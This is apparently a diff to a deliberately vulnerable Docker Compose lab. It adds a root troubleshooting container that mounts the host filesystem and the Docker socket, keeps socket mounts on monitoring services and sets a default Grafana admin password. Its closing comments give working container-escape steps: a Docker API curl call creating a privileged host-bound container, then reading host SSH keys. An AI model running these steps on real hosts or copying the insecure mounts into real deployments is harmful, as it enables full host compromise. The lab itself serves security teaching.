@@ -1,4 +1,37 @@
 services:
+  # VULNERABLE: IT Troubleshooting container with dangerous privileges
+  # 🚨 This simulates a "convenience" container for IT admins to troubleshoot
+  # Common pattern: Give IT "full access" for easier troubleshooting = security disaster
+  it-troubleshooting:
+    image: alpine:latest
+    container_name: it-troubleshoot-vulnerable
+    
+    # 🚨 SECURITY VULNERABILITY: Running as root for "admin convenience"
+    user: "0:0"  # root:root - "IT needs full access"
+    
+    # 🚨 SECURITY VULNERABILITY: Mount everything for "complete visibility"
+    volumes:
+      - /proc:/host/proc:ro
+      - /sys:/host/sys:ro  
+      - /:/rootfs:ro,rslave
+      # 🚨 CRITICAL VULNERABILITY: Docker socket for "container management"
+      - /var/run/docker.sock:/var/run/docker.sock
+    
+    # Install troubleshooting tools that IT "needs"
+    command: |
+      sh -c "
+      apk add --no-cache curl wget htop procps net-tools &&
+      echo 'IT Troubleshooting container ready - Full admin access!' &&
+      tail -f /dev/null
+      "
+    
+    restart: unless-stopped
+    
+    labels:
+      - "purpose=it-troubleshooting"
+      - "team=infrastructure"
+      - "vulnerability=excessive-privileges"
+
   # VULNERABLE: Node Exporter with Docker socket access
   # 🚨 This demonstrates the WRONG way - giving monitoring tools Docker socket access
   node-exporter:
@@ -7,7 +40,7 @@ services:
 
     # ✅ These mounts are legitimate and needed for monitoring
     # /proc - Process and system information
-    # /sys - System device and kernel information
+    # /sys - System device and kernel information  
     # / - Root filesystem (read-only) for disk usage metrics
     volumes:
       - /proc:/host/proc:ro
@@ -16,18 +49,18 @@ services:
       # 🚨 SECURITY VULNERABILITY: Docker socket mount
       # This is UNNECESSARY for monitoring but creates massive security hole
       - /var/run/docker.sock:/var/run/docker.sock
-
+    
     command:
       - "--path.procfs=/host/proc"
       - "--path.sysfs=/host/sys"
       - "--path.rootfs=/rootfs"
       - "--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)"
-
+    
     ports:
       - "9100:9100"
-
+    
     restart: unless-stopped
-
+    
     labels:
       - "purpose=system-monitoring"
       - "vulnerability=docker-socket-exposed"
@@ -36,7 +69,7 @@ services:
   prometheus:
     image: prom/prometheus:latest
     container_name: prometheus-vulnerable
-
+    
     command:
       - "--config.file=/etc/prometheus/prometheus.yml"
       - "--storage.tsdb.path=/prometheus"
@@ -44,54 +77,69 @@ services:
       - "--web.console.libraries=/etc/prometheus/console_libraries"
       - "--web.console.templates=/etc/prometheus/consoles"
       - "--web.enable-lifecycle"
-
+    
     volumes:
       - ./prometheus-config:/etc/prometheus
       # 🚨 SECURITY VULNERABILITY: Docker socket mount
       # Prometheus doesn't need this but "admin convenience" adds it
       - /var/run/docker.sock:/var/run/docker.sock
-
+    
     ports:
       - "9090:9090"
-
+    
     depends_on:
       - node-exporter
-
+    
     restart: unless-stopped
-
+    
     labels:
       - "purpose=metrics-collection"
       - "vulnerability=docker-socket-exposed"
 
-  # Grafana: Visualizes the metrics
+  # Grafana: Visualizes the metrics  
   grafana:
     image: grafana/grafana:latest
     container_name: grafana-vulnerable
-
+    
     environment:
       - GF_SECURITY_ADMIN_PASSWORD=admin
       - GF_USERS_ALLOW_SIGN_UP=false
       - GF_INSTALL_PLUGINS=
-
+    
     ports:
       - "3000:3000"
-
+    
     depends_on:
       - prometheus
-
+    
     restart: unless-stopped
-
+    
     labels:
       - "purpose=metrics-visualization"
-# ATTACK DEMONSTRATION:
-# =====================
+
+# CONTAINER ESCAPE DEMONSTRATION:
+# ===============================
 # 1. Start containers: docker-compose -f docker-compose-vulnerable.yaml up -d
-# 2. Access ANY container with Docker socket:
-#    docker exec -it node-exporter-vulnerable sh
-#    docker exec -it prometheus-vulnerable sh
-# 3. From INSIDE any container, create privileged container:
-#    docker run -it --rm --privileged --pid=host -v /:/hostfs alpine chroot /hostfs bash
-# 4. You are now ROOT on the HOST SYSTEM with full filesystem access!
-#
-# This demonstrates that Docker socket mount = complete host compromise
-# The monitoring functionality works perfectly but security is destroyed!
+# 2. Access IT troubleshooting container:
+#    docker exec -it it-troubleshoot-vulnerable sh
+#    
+# 3. Verify dangerous access:
+#    whoami                           # root - unnecessary for troubleshooting
+#    ls -la /var/run/docker.sock     # Docker socket access - VERY dangerous
+#    
+# 4. Container escape via Docker API:
+#    # Create privileged container with host filesystem access
+#    curl --unix-socket /var/run/docker.sock -X POST \
+#      -H "Content-Type: application/json" \
+#      -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Privileged":true,"Binds":["/:/hostfs"],"PidMode":"host"},"Tty":true,"OpenStdin":true}' \
+#      http://localhost/containers/create
+#    
+#    # Extract container ID from response, then start and attach:
+#    # curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/{ID}/start
+#    # docker exec -it {ID} chroot /hostfs bash
+#    
+# 5. Alternative: Direct host access via existing mounts:
+#    ls -la /rootfs/etc/passwd        # Host's user accounts
+#    ls /rootfs/root/.ssh/            # Host's SSH keys
+#    
+# Result: Complete host compromise from "troubleshooting" container access!
